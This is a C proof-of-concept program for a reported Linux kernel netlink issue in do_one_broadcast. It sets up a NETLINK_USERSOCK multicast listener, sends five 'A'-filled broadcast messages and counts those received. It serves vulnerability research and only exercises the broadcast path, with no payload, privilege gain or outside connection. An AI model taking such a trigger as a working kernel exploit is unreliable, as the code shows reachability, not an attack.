/*
 * PoC for WMI-3: Attacker-Determined Content in an Authoritative Position
 * @ do_one_broadcast (net/netlink/af_netlink.c:1473)
 *
 * Trigger: netlink_sendmsg -> netlink_broadcast -> do_one_broadcast
 *
 * We create a listener socket bound to a multicast group, then a sender
 * socket that connects to the same group and sends a broadcast message.
 * Multiple broadcasts exercise the skb_clone path at do_one_broadcast:1473.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>

#define BUF_SIZE    65536

/* Create a netlink listener socket bound to a multicast group */
static int create_listener(int protocol, int group)
{
    struct sockaddr_nl addr;
    int fd, ret;

    fd = socket(AF_NETLINK, SOCK_RAW, protocol);
    if (fd < 0) { perror("listener: socket"); return -1; }

    memset(&addr, 0, sizeof(addr));
    addr.nl_family = AF_NETLINK;
    addr.nl_groups = group;
    addr.nl_pid = 0; /* kernel assigns */

    ret = bind(fd, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) { perror("listener: bind"); close(fd); return -1; }

    return fd;
}

/* Drain one message from the listener socket (nonblocking) */
static int drain_one(int fd)
{
    char buf[BUF_SIZE];
    struct sockaddr_nl from;
    struct iovec iov = { .iov_base = buf, .iov_len = sizeof(buf) };
    struct msghdr msg = {
        .msg_name = &from, .msg_namelen = sizeof(from),
        .msg_iov = &iov, .msg_iovlen = 1,
    };
    ssize_t n = recvmsg(fd, &msg, MSG_DONTWAIT);
    if (n > 0) {
        printf("  [listener fd=%d] received %zd bytes\n", fd, n);
        return 1;
    }
    return 0;
}

/* Listener thread: poll for messages */
struct listener_arg { int fd; int *count; pthread_mutex_t *lock; };
static void *listener_poll(void *arg)
{
    struct listener_arg *la = (struct listener_arg *)arg;
    int i;
    for (i = 0; i < 50; i++) {
        if (drain_one(la->fd)) {
            if (la->lock) {
                pthread_mutex_lock(la->lock);
                (*la->count)++;
                pthread_mutex_unlock(la->lock);
            }
        }
        usleep(10000); /* 10 ms */
    }
    return NULL;
}

/* Sender: send a broadcast to a multicast group */
static int send_broadcast(int protocol, int group,
                          const void *data, size_t datalen)
{
    struct sockaddr_nl addr;
    struct nlmsghdr *nlh;
    struct iovec iov;
    struct msghdr msg;
    int fd, ret;

    fd = socket(AF_NETLINK, SOCK_RAW, protocol);
    if (fd < 0) { perror("send: socket"); return -1; }

    /* Connect to the multicast group */
    memset(&addr, 0, sizeof(addr));
    addr.nl_family = AF_NETLINK;
    addr.nl_groups = group;
    addr.nl_pid = 0;

    ret = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) {
        perror("send: connect");
        close(fd);
        return -1;
    }

    /* Build netlink message */
    {
        size_t total = sizeof(struct nlmsghdr) + datalen;
        nlh = calloc(1, total);
        if (!nlh) { close(fd); return -1; }
        nlh->nlmsg_len = total;
        nlh->nlmsg_type = NLMSG_NOOP;
        nlh->nlmsg_flags = 0;
        nlh->nlmsg_seq = 0;
        nlh->nlmsg_pid = 0;
        memcpy(NLMSG_DATA(nlh), data, datalen);

        memset(&msg, 0, sizeof(msg));
        /* No msg_name -> dst from connect() */
        iov.iov_base = nlh;
        iov.iov_len = total;
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        ret = sendmsg(fd, &msg, 0);
        if (ret < 0)
            perror("send: sendmsg");

        free(nlh);
    }

    close(fd);
    return ret;
}

int main(void)
{
    int protocol = NETLINK_USERSOCK; /* 2 */
    int group = 1;
    int listener;
    pthread_t t;
    struct listener_arg la;
    int received = 0;
    int i, ret;
    char payload[256];

    printf("=== PoC: do_one_broadcast broadcast trigger ===\n");
    printf("Protocol: NETLINK_USERSOCK (%d)  Group: %d\n", protocol, group);

    /* Create ONE listener */
    listener = create_listener(protocol, group);
    if (listener < 0)
        return 1;
    printf("Listener bound: fd=%d\n", listener);

    /* Start polling thread */
    memset(&la, 0, sizeof(la));
    la.fd = listener;
    la.count = &received;
    {
        static pthread_mutex_t mtx = PTHREAD_MUTEX_INITIALIZER;
        la.lock = &mtx;
    }
    pthread_create(&t, NULL, listener_poll, &la);

    /* Send some broadcast messages */
    memset(payload, 0x41, sizeof(payload));

    for (i = 0; i < 5; i++) {
        payload[0] = (char)(0x41 + i);
        ret = send_broadcast(protocol, group, payload, sizeof(payload));
        printf("  send_broadcast #%d: %s\n", i, ret < 0 ? "FAIL" : "OK");
        usleep(1000);
    }

    /* Wait for polling thread to drain */
    pthread_join(t, NULL);
    close(listener);

    printf("Total received: %d\n", received);
    printf("=== Done ===\n");
    return received > 0 ? 0 : 1;
}
